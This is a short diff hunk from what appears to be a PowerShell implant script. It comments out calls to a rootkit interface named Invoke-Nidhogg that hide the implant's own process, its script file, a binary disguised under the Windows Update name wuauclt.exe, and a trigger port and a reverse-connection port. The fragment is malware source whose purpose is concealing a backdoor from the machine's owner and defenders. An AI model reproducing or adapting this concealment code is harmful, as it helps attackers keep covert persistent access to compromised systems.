@@ -15,11 +15,11 @@ function Invoke-Nidhogg {
 }
 
 # Initial hiding
-Invoke-Nidhogg "process hide $PID"
-Invoke-Nidhogg "file hide $AppDir\Implant.ps1"
-Invoke-Nidhogg "file hide $AppDir\wuauclt.exe"
-Invoke-Nidhogg "port hide $TriggerPort tcp remote"
-Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"
+# Invoke-Nidhogg "process hide $PID"
+# Invoke-Nidhogg "file hide $AppDir\Implant.ps1"
+# Invoke-Nidhogg "file hide $AppDir\wuauclt.exe"
+# Invoke-Nidhogg "port hide $TriggerPort tcp remote"
+# Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"
 
 while ($true) {
     try {
